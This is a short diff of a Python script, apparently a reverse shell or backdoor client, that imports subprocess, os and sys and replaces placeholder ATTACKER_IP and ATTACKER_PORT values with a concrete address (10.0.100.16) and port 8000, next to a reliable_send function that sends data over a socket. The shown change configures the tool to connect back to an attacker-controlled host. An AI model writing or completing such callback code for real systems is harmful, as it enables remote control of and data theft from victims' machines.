@@ -3,8 +3,8 @@ import subprocess
 import os
 import sys
 
-ATTACKER_IP = "ATTACKER_IP"
-ATTACKER_PORT = ATTACKER_PORT
+ATTACKER_IP = "10.0.100.16"
+ATTACKER_PORT = 8000
 
 def reliable_send(data, conn):
     conn.send(data.encode('utf-8'))
